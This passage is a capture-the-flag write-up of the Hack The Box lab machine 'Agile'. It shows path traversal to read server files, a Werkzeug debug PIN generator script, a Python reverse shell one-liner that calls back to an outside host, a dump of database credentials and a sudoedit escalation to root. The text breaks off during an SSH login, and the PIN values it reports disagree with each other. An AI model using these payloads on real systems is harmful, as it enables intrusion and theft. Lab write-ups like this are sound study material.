---
tags:
  - flask
  - chrome
  - sudoedit
group: Linux
---
![](https://labs.hackthebox.com/storage/avatars/8fa064016362fbfce91b5de54b7e7f7e.png)

- Machine : https://app.hackthebox.com/machines/Agile
- Reference : https://0xdf.gitlab.io/2023/08/05/htb-agile.html
- Solved : 2024.11.30. (Sat) (Takes 2days)

### Summary
---

1. **Initial Reconnaissance**
    
    - **Port Scanning**: Identified open ports `22 (SSH)` and `80 (HTTP)` using Nmap.
    - **Nikto Scan**: Found basic server misconfigurations like missing HTTP security headers.
    - **Web Enumeration**: Discovered `superpass.htb` and functionality to register/login and export password data.
2. **Web Application Exploitation**
    
    - **LFI Vulnerability**: Exploited `../` path traversal in the file download endpoint to access server-side files (`/etc/passwd`, `/etc/nginx/nginx.conf`).
    - **Debug Mode Exposure**: Identified Flask's debug mode enabled, leaking the application’s file paths and allowing PIN brute-forcing.
3. **Exploit Flask Debug PIN**
    
    - Used leaked values like the `machine-id`, `MAC address`, and application file paths to calculate the Flask debug PIN using a Python script.
    - Gained Python shell access and executed a reverse shell payload to obtain a `www-data` shell.
4. **Privilege Escalation to `corum`**
    
    - **Configuration File Leak**: Retrieved database credentials (`config_prod.json`) using LFI and found `corum`'s hashed password stored in MySQL.
    - **Password Cracking**: Used leaked hash to log in as `corum`.
5. **Privilege Escalation to `edwards`**
    
    - **Google Chrome Debug Port**: Exposed through `--remote-debugging-port=41829`. SSH port forwarding allowed local inspection using Chrome Developer Tools.
    - Found plaintext credentials for `edwards` in browser logs and switched to `edwards`.
6. **Privilege Escalation to `root`**
    
    - **Sudo Privilege Enumeration**: `edwards` had access to run `sudoedit` on files owned by `dev_admin`.
    - **Privilege Escalation via Sudoedit**:
        - Edited the `/app/venv/bin/activate` script, which was executed periodically by a root-owned cron job (`/app/test_and_update.sh`).
        - Added commands to create a SUID-enabled `bash` binary (`rootbash`).
    - Obtained a root shell by executing the `rootbash` binary.

### Key Techniques:

- **Local File Inclusion (LFI)**: Exploited path traversal to access server-side files.
- **Flask Debug Mode Abuse**: Generated and used debug PIN for shell access.
- **Database Credential Extraction**: Leveraged configuration files and MySQL access to retrieve user credentials.
- **Chrome Debug Port Exploitation**: Inspected browser debug logs via SSH tunneling to extract sensitive data.
- **Sudoedit Privilege Abuse**: Modified Python virtual environment scripts to exploit a root-owned cron job.
- **SUID Binary Creation**: Created a SUID-enabled `bash` binary for root access.

---

# Reconnaissance

### Port Scanning

```bash
┌──(kali㉿kali)-[~/htb]
└─$ ./port-scan.sh 10.10.11.203
Performing quick port scan on 10.10.11.203...
Found open ports: 22,80
Performing detailed scan on 10.10.11.203...
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-29 16:01 EST
Nmap scan report for 10.10.11.203
Host is up (0.12s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f4:bc:ee:21:d7:1f:1a:a2:65:72:21:2d:5b:a6:f7:00 (ECDSA)
|_  256 65:c1:48:0d:88:cb:b9:75:a0:2c:a5:e6:37:7e:51:06 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://superpass.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.62 seconds
```

Based on port scanning, there are only 2 open ports : `22`, `80`.
The domain name found is `superpass.htb`.
The web server is running on `nginx/1.18.0`.

### http(80)

Let's run scanning first.

```markdown
┌──(kali㉿kali)-[~/htb]
└─$ nikto -h http://superpass.htb
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.11.203
+ Target Hostname:    superpass.htb
+ Target Port:        80
+ Start Time:         2024-11-29 16:05:27 (GMT-5)
---------------------------------------------------------------------------
+ Server: nginx/1.18.0 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ nginx/1.18.0 appears to be outdated (current is at least 1.20.1).
+ OPTIONS: Allowed HTTP Methods: GET, OPTIONS, HEAD .
```

The `nikto` scan doesn't show any special vulnerabilities.

Let's visit the main page : `http://superpass.htb`

![](attachments/agile_1.png)

There is a funny-looking website coming out.
It apparently has login page.

![](attachments/agile_2.png)

This login page contains `Register` function.

![](attachments/agile_3.png)

I can simply create a new user from the register menu.

![](attachments/agile_4.png)

Then, I can see the page above which looks like a password managing page.
Let's open `Burpsuite` and try to observe what's being sent or received while interacting with the web.

```makefile
POST /vault/add_row HTTP/1.1
Host: superpass.htb
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
HX-Request: true
HX-Current-URL: http://superpass.htb/vault
Content-Type: application/x-www-form-urlencoded
Content-Length: 60
Origin: http://superpass.htb
Connection: keep-alive
Referer: http://superpass.htb/vault
Cookie: session=.eJwlTsuKwzAM_BWjc1ks-aEkX7H3pRTZkZpAdlvi9FT67-vS08wwD-YJF9ukLdpg-nmCOzrAr7YmV4UTfG8qTd12u7r1zx03J7V20x3L2ty9Z77g_Dqf-siubYHp2B_a1TrDBFw8ofoBec6FIlMaiyjVZJ0hDjVnVpzNODOhL95ySDyTBE1Dwmw1x_I2ChUOMcReHCx6MYyJCo7iZZCUOHGtQSmwVKtaDZFNIvX7l0fT_fNmhNc_iEtFoA.Z0ouQw.bi2tYCLza62IFM2tl1xz3z_TwiQ; remember_token=9|96d9e49f39e29dffb3f091dd95ce4c04f91ceab9310eedb1809bce604e4e5dd474f4cf5610df60d8bfb492914697190f06d566108bc098423bc1f74e930f7fbf

url=test.com&username=testtest&password=5aec26888345340a6607
```

The POST request when I'm trying to add a new password.

```
GET /vault/export HTTP/1.1
Host: superpass.htb
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: session=.eJwlTsuKwzAM_BWjc1ks-aEkX7H3pRTZkZpAdlvi9FT67-vS08wwD-YJF9ukLdpg-nmCOzrAr7YmV4UTfG8qTd12u7r1zx03J7V20x3L2ty9Z77g_Dqf-siubYHp2B_a1TrDBFw8ofoBec6FIlMaiyjVZJ0hDjVnVpzNODOhL95ySDyTBE1Dwmw1x_I2ChUOMcReHCx6MYyJCo7iZZCUOHGtQSmwVKtaDZFNIvX7l0fT_fNmhNc_iEtFoA.Z0ouQw.bi2tYCLza62IFM2tl1xz3z_TwiQ; remember_token=9|96d9e49f39e29dffb3f091dd95ce4c04f91ceab9310eedb1809bce604e4e5dd474f4cf5610df60d8bfb492914697190f06d566108bc098423bc1f74e930f7fbf
Upgrade-Insecure-Requests: 1

===================================================

GET /download?fn=bokchee_export_8550b9697f.csv HTTP/1.1
Host: superpass.htb
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: session=.eJwlTsuKwzAM_BWjc1ks-aEkX7H3pRTZkZpAdlvi9FT67-vS08wwD-YJF9ukLdpg-nmCOzrAr7YmV4UTfG8qTd12u7r1zx03J7V20x3L2ty9Z77g_Dqf-siubYHp2B_a1TrDBFw8ofoBec6FIlMaiyjVZJ0hDjVnVpzNODOhL95ySDyTBE1Dwmw1x_I2ChUOMcReHCx6MYyJCo7iZZCUOHGtQSmwVKtaDZFNIvX7l0fT_fNmhNc_iEtFoA.Z0ouQw.bi2tYCLza62IFM2tl1xz3z_TwiQ; remember_token=9|96d9e49f39e29dffb3f091dd95ce4c04f91ceab9310eedb1809bce604e4e5dd474f4cf5610df60d8bfb492914697190f06d566108bc098423bc1f74e930f7fbf
Upgrade-Insecure-Requests: 1
```

Request to export passwords. The export request is divided into two separate requests.
Especially, it looks like the second GET request seems to download directly from the server.
I think it'd be good to tamper this request. Let's try with intentionally wrong file path.

```makefile
GET /download?fn=notexist.csv HTTP/1.1
Host: superpass.htb
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: session=.eJwlTsuKwzAM_BWjc1ks-aEkX7H3pRTZkZpAdlvi9FT67-vS08wwD-YJF9ukLdpg-nmCOzrAr7YmV4UTfG8qTd12u7r1zx03J7V20x3L2ty9Z77g_Dqf-siubYHp2B_a1TrDBFw8ofoBec6FIlMaiyjVZJ0hDjVnVpzNODOhL95ySDyTBE1Dwmw1x_I2ChUOMcReHCx6MYyJCo7iZZCUOHGtQSmwVKtaDZFNIvX7l0fT_fNmhNc_iEtFoA.Z0ouQw.bi2tYCLza62IFM2tl1xz3z_TwiQ; remember_token=9|96d9e49f39e29dffb3f091dd95ce4c04f91ceab9310eedb1809bce604e4e5dd474f4cf5610df60d8bfb492914697190f06d566108bc098423bc1f74e930f7fbf
Upgrade-Insecure-Requests: 1

===================================================

HTTP/1.1 500 INTERNAL SERVER ERROR
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 29 Nov 2024 21:22:29 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 13539
Connection: keep-alive

<!doctype html>
<html lang=en>
  <head>
    <title>FileNotFoundError: [Errno 2] No such file or directory: '/tmp/notexist.csv'
 // Werkzeug Debugger
<SNIP>
```

It reveals critical information that the export function is trying to fetch files from `/tmp` directory.
I think if we use `..` wildcard, we can directly access to server-side files. Let's try.

```bash
GET /download?fn=../etc/passwd HTTP/1.1
<SNIP>

===================================================

<SNIP>

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
corum:x:1000:1000:corum:/home/corum:/bin/bash
dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
mysql:x:109:112:MySQL Server,,,:/nonexistent:/bin/false
runner:x:1001:1001::/app/app-testing/:/bin/sh
edwards:x:1002:1002::/home/edwards:/bin/bash
dev_admin:x:1003:1003::/home/dev_admin:/bin/bash
_laurel:x:999:999::/var/log/laurel:/bin/false
```

Yes, it allows Local-File Inclusion!
From the `/etc/passwd` file, we can find `corum`, `edwards`, `runner`, `dev_admin` which might be used for gaining a shell.

Let's try read `nginx` configuration files.

```shell
GET /download?fn=../etc/nginx/nginx.conf HTTP/1.1
<SNIP>

===================================================

events {
	worker_connections 768;
	# multi_accept on;
}

http {

	##
	# Basic Settings
	##

	sendfile on;
	tcp_nopush on;
	types_hash_max_size 2048;
	# server_tokens off;

	# server_names_hash_bucket_size 64;
	# server_name_in_redirect off;

	include /etc/nginx/mime.types;
	default_type application/octet-stream;

	##
	# SSL Settings
	##

	ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # Dropping SSLv3, ref: POODLE
	ssl_prefer_server_ciphers on;

	##
	# Logging Settings
	##

	access_log /var/log/nginx/access.log;
	error_log /var/log/nginx/error.log;

	##
	# Gzip Settings
	##

	gzip on;

	# gzip_vary on;
	# gzip_proxied any;
	# gzip_comp_level 6;
	# gzip_buffers 16 8k;
	# gzip_http_version 1.1;
	# gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;

	##
	# Virtual Host Configs
	##

	include /etc/nginx/conf.d/*.conf;
	include /etc/nginx/sites-enabled/*;
}
```

# Shell as `www-data`

### Exploiting Flask Debug mode

While testing the app, I could find 404 error page which is default 404 page of Flask.
Plus, when I intentionally typed in wrong path to LFI injection vector, it shows the following error.

![](attachments/agile_5.png)

This reveals the path to the flask app : `/app/venv/lib/python3.10/site-packages/flask/app.py`
Plus, it reveals the application name : `wsgi_app`

When I click the code, it shows a prompt to take a pin to open console.

![](attachments/agile_6.png)

However, we don't have any clue of the PIN for now.\
Let's collect system information first.

```shell
GET /download?fn=../proc/self/environ HTTP/1.1
<SNIP>

===================================================

LANG=C.UTF-8 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin HOME=/var/www
LOGNAME=www-data
USER=www-data
INVOCATION_ID=20a2abff4db442be9be41ce2e11074b3
JOURNAL_STREAM=8:32827
SYSTEMD_EXEC_PID=1073
CONNFIG_PATH=/app/config_prod.json
```

Based on this `environ` output, current user is `www-data`.

Here's the recommended article and reference to exploit Flask Debug mode:
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug
https://www.youtube.com/watch?v=6BWaea0nfE0
https://www.bengrewell.com/cracking-flask-werkzeug-console-pin/

Based on "Hacktricks" article, there's a python code to generate pin.
However, this requires some values to be modified.

```python
import hashlib
from itertools import chain
probably_public_bits = [
    'web3_user',  # username
    'flask.app',  # modname
    'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.5/dist-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
    '279275995014060',  # str(uuid.getnode()),  /sys/class/net/ens33/address
    'd4e6cb65d59544f3331ea0425dc555a1'  # get_machine_id(), /etc/machine-id
]

# h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
# h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

`username`, `getattr(mod, '__file__', None)`, `str(uuid.getnode())`, `get_machine_id()` should be modified. I can collect these informations exploiting LFI vulnerability.

```shell
GET /download?fn=../proc/net/arp HTTP/1.1
<SNIP>

===================================================

IP address       HW type     Flags       HW address            Mask     Device
10.10.10.2       0x1         0x2         00:50:56:b9:f4:88     *        eth0
```

The ethernet device name is `eth0`.

```shell
GET /download?fn=../sys/class/net/eth0/address HTTP/1.1
<SNIP>

===================================================

00:50:56:94:05:36
```

The MAC address is `00:50:56:94:05:36`

```python-repl
>>> 0x005056940536
345049924918
```

The MAC address can be transformed to decimal : `345049924918`.

```shell
GET /download?fn=../etc/machine-id HTTP/1.1
<SNIP>

===================================================

ed5b159560f54721827644bc9b220d00
```

machine_id is `ed5b159560f54721827644bc9b220d00`

I reviewed Hacktricks again, and found the comment at last.

![](attachments/agile_8.png)

To check the hashing algorithm, I can read `werkzeug/debug/__init__.py` file.

```shell
GET /download?fn=../app/venv/lib/python3.10/site-packages/werkzeug/debug/__init__.py HTTP/1.1
<SNIP>

===================================================

<SNIP>
def hash_pin(pin: str) -> str:
    return hashlib.sha1(f"{pin} added salt".encode("utf-8", "replace")).hexdigest()[:12]
<SNIP>
```

It's using `sha1` algorithm.

Now we've obtained all required values.
Let's edit the exploit code.

```python
probably_public_bits = [
    'www-data',  # username
    'flask.app',  # modname
    'wsgi_app',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/app/venv/lib/python3.10/site-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
    '345049924918',  # str(uuid.getnode()),  /sys/class/net/ens33/address
    'ed5b159560f54721827644bc9b220d00superpass.service'  # get_machine_id(), /etc/machine-id
]
```

After editing, I can run the code to generate PIN.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ python generate_pin.py                
143-995-682
```

The generated in is `135-363-678`.
Let's use this value to console.

![](attachments/agile_9.png)

Yeah, I can successfully obtain the python shell.

On this shell, I can use python based reverse shell code as follows;

`import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",9000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")`

Then, netcat listener will take the request and open a shell.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ nc -nlvp 9000
listening on [any] 9000 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.11.203] 38810
$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


# Shell as `corum`

### Enumeration

Let's take a look at the webroot directory.

```bash
(venv) www-data@agile:/app$ cat config_prod.json
cat config_prod.json
{"SQL_URI": "mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass"}
```

From the upper folder `/app`, I can find `config_prod.json` which contains DB credential for `superpassuser` : `dSA6l7q*yIVs$39Ml6ywvgK`
Since `superpassuser` doesn't exist in `/etc/passwd`, I think it will be working only in `mysql`.

```bash
(venv) www-data@agile:/app/app-testing/tests/functional$ ls -al
ls -al
total 20
drwxr-xr-x 3 runner    runner 4096 Feb  7  2023 .
drwxr-xr-x 3 runner    runner 4096 Feb  6  2023 ..
drwxrwxr-x 2 runner    runner 4096 Nov 30 11:33 __pycache__
-rw-r----- 1 dev_admin runner   34 Nov 30 11:36 creds.txt
-rw-r--r-- 1 runner    runner 2663 Nov 30 11:36 test_site_interactively.py
(venv) www-data@agile:/app/app-testing/tests/functional$ cat creds.txt
cat creds.txt
cat: creds.txt: Permission denied
```

I can find `creds.txt` which is expected to have credentials, but can't open it for now.
Probably, I have to move to `dev_admin` to have more permissions.

### mysql

Using the owned credential for `superpassuser`, let's connect to `mysql` service, and try to see what's in it.

```sql
(venv) www-data@agile:/app/app-testing/tests/functional$ mysql -u superpassuser -p
<testing/tests/functional$ mysql -u superpassuser -p     
Enter password: dSA6l7q*yIVs$39Ml6ywvgK

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 38
Server version: 8.0.32-0ubuntu0.22.04.2 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| performance_schema |
| superpass          |
+--------------------+
3 rows in set (0.00 sec)

mysql> use superpass;
use superpass;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+---------------------+
| Tables_in_superpass |
+---------------------+
| passwords           |
| users               |
+---------------------+
2 rows in set (0.00 sec)

mysql> select * from passwords;
select * from passwords;
+----+---------------------+---------------------+----------------+----------+----------------------+---------+
| id | created_date        | last_updated_data   | url            | username | password             | user_id |
+----+---------------------+---------------------+----------------+----------+----------------------+---------+
|  3 | 2022-12-02 21:21:32 | 2022-12-02 21:21:32 | hackthebox.com | 0xdf     | 762b430d32eea2f12970 |       1 |
|  4 | 2022-12-02 21:22:55 | 2022-12-02 21:22:55 | mgoblog.com    | 0xdf     | 5b133f7a6a1c180646cb |       1 |
|  6 | 2022-12-02 21:24:44 | 2022-12-02 21:24:44 | mgoblog        | corum    | 47ed1e73c955de230a1d |       2 |
|  7 | 2022-12-02 21:25:15 | 2022-12-02 21:25:15 | ticketmaster   | corum    | 9799588839ed0f98c211 |       2 |
|  8 | 2022-12-02 21:25:27 | 2022-12-02 21:25:27 | agile          | corum    | 5db7caa1d13cc37c9fc2 |       2 |
+----+---------------------+---------------------+----------------+----------+----------------------+---------+
5 rows in set (0.00 sec)

mysql> select * from users;
select * from users;
+----+----------+--------------------------------------------------------------------------------------------------------------------------+
| id | username | hashed_password                                                                                                          |
+----+----------+--------------------------------------------------------------------------------------------------------------------------+
|  1 | 0xdf     | $6$rounds=200000$FRtvqJFfrU7DSyT7$8eGzz8Yk7vTVKudEiFBCL1T7O4bXl0.yJlzN0jp.q0choSIBfMqvxVIjdjzStZUYg6mSRB2Vep0qELyyr0fqF. |
|  2 | corum    | $6$rounds=200000$yRvGjY1MIzQelmMX$9273p66QtJQb9afrbAzugxVFaBhb9lyhp62cirpxJEOfmIlCy/LILzFxsyWj/mZwubzWylr3iaQ13e4zmfFfB1 |
|  9 | bokchee  | $6$rounds=200000$hdzdR9b6vnVAidb0$7kYVSC9lxJG1HyWUsFRw6Ln2WsiFrTohwPrikGEIEPYnHz6KqlmtWhLgJktRWlwoWoHxdjNfrU8vJu5MOqIuZ/ |
+----+----------+--------------------------------------------------------------------------------------------------------------------------+
3 rows in set (0.00 sec)
```

From database, I can find several credentials including `corum`'s.
Among these, `corum` is working locally.

```bash
(venv) www-data@agile:/app/app-testing/tests/functional$ su corum
su corum
Password: 5db7caa1d13cc37c9fc2

corum@agile:/app/app-testing/tests/functional$ id
id
uid=1000(corum) gid=1000(corum) groups=1000(corum)
```


# Shell as `edwards`

### Enumeration

```bash
corum@agile:/app/app-testing/tests/functional$ sudo -l
sudo -l
[sudo] password for corum: 5db7caa1d13cc37c9fc2

Sorry, user corum may not run sudo on agile.
```

It's not sudoable.

```bash
corum@agile:/app/app-testing/tests/functional$ find / -perm -4000 2>/dev/null
find / -perm -4000 2>/dev/null
/usr/libexec/polkit-agent-helper-1
/usr/bin/umount
/usr/bin/mount
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/fusermount3
/usr/bin/su
/usr/bin/newgrp
/usr/bin/sudo
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/opt/google/chrome/chrome-sandbox
```

Among the SUID binaries, `chrome-sandbox` looks interesting...

```bash
corum@agile:/app/app-testing/tests/functional$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
corum@agile:/app/app-testing/tests/functional$ crontab -l
crontab -l
# m h  dom mon dow   command
```

No cron job exists.

```bash
corum@agile:/tmp$ ./linpeas_linux_amd64
./linpeas_linux_amd64


╔══════════╣ Running processes (cleaned)
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes
<SNIP>
runner      8056  0.8  2.5 34064436 103392 ?     Sl   12:50   0:00                      _ /usr/bin/google-chrome --allow-pre-commit-input --crash-dumps-dir=/tmp --disable-background-networking --disable-client-side-phishing-detection --disable-default-apps --disable-gpu --disable-hang-monitor --disable-popup-blocking --disable-prompt-on-repost --disable-sync --enable-automation --enable-blink-features=ShadowDOMV0 --enable-logging --headless --log-level=0 --no-first-run --no-service-autorun --password-store=basic --remote-debugging-port=41829 --test-type=webdriver --use-mock-keychain --user-data-dir=/tmp/.com.google.Chrome.hb9Kzp --window-size=1420,1080 data:,


╔══════════╣ Last time logon each user
Username         Port     From             Latest                          
root             tty1                      Wed Mar  1 18:48:54 +0000 2023
corum            pts/2    10.10.14.14      Sat Nov 30 12:21:08 +0000 2024
edwards          pts/0    10.10.14.23      Thu Mar  2 10:28:51 +0000 2023
```

**linPEAS** found several interesting findings..
There's something regarding `google-chrome` is running behind as `root`.
Based on its parameter, `--remote-debuggin-port` is `41829`.

```bash
corum@agile:/app/app-testing/superpass$ tail app.py
tail app.py

def dev():
    configure()
    app.run(port=5555)


if __name__ == '__main__':
    main()
else:
    configure()
```

There's an `app-testing` which is different from normal `app`.
It's running on port 5555.
Let me double check with listening port.

```bash
corum@agile:/app/app-testing/superpass$ ss -lntp
ss -lntp
State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess
LISTEN 0      70         127.0.0.1:33060      0.0.0.0:*          
LISTEN 0      10         127.0.0.1:41829      0.0.0.0:*          
LISTEN 0      2048       127.0.0.1:5000       0.0.0.0:*          
LISTEN 0      5          127.0.0.1:34345      0.0.0.0:*          
LISTEN 0      151        127.0.0.1:3306       0.0.0.0:*          
LISTEN 0      511          0.0.0.0:80         0.0.0.0:*          
LISTEN 0      2048       127.0.0.1:5555       0.0.0.0:*          
LISTEN 0      4096   127.0.0.53%lo:53         0.0.0.0:*          
LISTEN 0      128          0.0.0.0:22         0.0.0.0:*          
LISTEN 0      5              [::1]:34345         [::]:*          
LISTEN 0      128             [::]:22            [::]:* 
```

As expected, port `5555` and `41829` are open.

```bash
corum@agile:/app/app-testing/tests/functional$ tail -n 20 test_site_interactively.py
<s/functional$ tail -n 20 test_site_interactively.py
            row.find_element(By.CLASS_NAME, "fa-trash").click()

    time.sleep(3)
    assert 'test_site' not in driver.page_source
    assert 'test_user' not in driver.page_source


def test_title(driver):
    print("starting test_title")
    driver.get('http://test.superpass.htb')
    time.sleep(3)
    assert "SuperPassword 🦸" == driver.title


def test_long_running(driver):
    print("starting test_long_running")
    driver.get('http://test.superpass.htb')
    time.sleep(550)
    #time.sleep(5)
    assert "SuperPasword 🦸" == driver.title
```

It obviously says that there must be another web service running as `test.superpass.htb` on port 5555. But it was not exposed externally.

```bash
corum@agile:/etc/nginx/sites-enabled$ ls
ls
agile.htb.nginx  redirect.nginx  superpass-test.nginx  superpass.nginx


corum@agile:/etc/nginx/sites-enabled$ cat superpass-test.nginx
cat superpass-test.nginx
server {
    listen 127.0.0.1:80;
    server_name test.superpass.htb;

    location /static {
        alias /app/app-testing/superpass/static;
        expires 365d;
    }
    location / {
        include uwsgi_params;
        proxy_pass http://127.0.0.1:5555;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-Protocol $scheme;
    }
}
```

To figure out the settings of it, I checked `nginx` setups.
There's `superpass-test.nginx`, which reveals that the `test.superpass.nginx` is bypassing the access to `test.superpass.htb` from remote host to `superpass.htb`.

Let's open a SSH tunneling.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ ssh -L 5555:127.0.0.1:5555 corum@10.10.11.203
The authenticity of host '10.10.11.203 (10.10.11.203)' can't be established.
ED25519 key fingerprint is SHA256:kxY+4fRgoCr8yE48B5Lb02EqxyyUN9uk6i/ZIH4H1pc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.203' (ED25519) to the list of known hosts.
corum@10.10.11.203's password: 
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-60-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
